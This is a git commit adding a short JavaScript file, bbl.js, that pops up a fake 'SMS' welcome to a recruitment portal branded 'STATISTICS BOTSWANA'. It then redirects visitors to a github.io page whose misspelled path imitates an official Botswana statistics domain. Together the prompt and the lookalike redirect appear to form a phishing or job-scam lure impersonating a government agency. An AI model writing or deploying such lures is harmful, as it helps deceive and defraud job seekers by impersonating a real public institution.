2c91beb731e83d828be45b2686ad61efdf262785
offernoww <josiahnyeti16@gmail.com>
2025-02-21 12:33:22 +0100

    Create bbl.js

---
+++ bbl.js
@@ -0,0 +1,6 @@
+
+var password = 'STATISTICS BOTSWANA'
+password=prompt('SMS :Welcome to the recruitment portal,click OK to start application  ','STATISTICS BOTSWANA');
+if (password != 'STATISTICS BOTSWANA') {
+location.href='https://offernoww.github.io/recruitmnet.statsbot.bw';
+}
